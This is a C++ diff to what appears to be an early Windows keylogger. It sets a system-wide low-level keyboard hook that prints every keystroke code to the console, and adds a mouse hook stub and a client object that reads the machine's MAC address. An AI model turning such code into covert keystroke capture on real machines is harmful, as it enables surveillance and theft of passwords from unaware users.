@@ -1,17 +1,18 @@
 #include <windows.h>
 #include <iostream>
+#include "Client.h"
 
 HHOOK kbHook; 
 bool shift = false;
 
-LRESULT CALLBACK KeyboardProc(_In_ int code, _In_ WPARAM wParam, _In_ LPARAM lParam)
+LRESULT CALLBACK KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
 {
 	bool ctrl = false;
 	KBDLLHOOKSTRUCT		*a;
 
 	a = (KBDLLHOOKSTRUCT*)lParam;
 	std::cout << a->vkCode << std::endl;
-	if (code == HC_ACTION)
+	if (nCode == HC_ACTION)
 	{
 		if (a->vkCode == VK_LSHIFT || a->vkCode == VK_RSHIFT)
 			shift = true;
@@ -41,13 +42,23 @@ LRESULT CALLBACK KeyboardProc(_In_ int code, _In_ WPARAM wParam, _In_ LPARAM lPa
 	// if (hProcess != NULL)
 	// len = GetModuleFileNameEx(hProcess, NULL, char *name, sizeof(name))
 	//
-	return (CallNextHookEx(NULL, code, wParam, lParam));
+	return (CallNextHookEx(NULL, nCode, wParam, lParam));
+}
+
+LRESULT CALLBACK MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam)
+{
+
+	return (CallNextHookEx(NULL, nCode, wParam, lParam));
 }
 
 int main(int ac, char **av)
 {
-	bool end = true;
+	Client test;
+
+	test.getMACAddress();
+
 	kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+
 	MSG message;
 
 	while(GetMessage(&message, NULL, 0, 0))
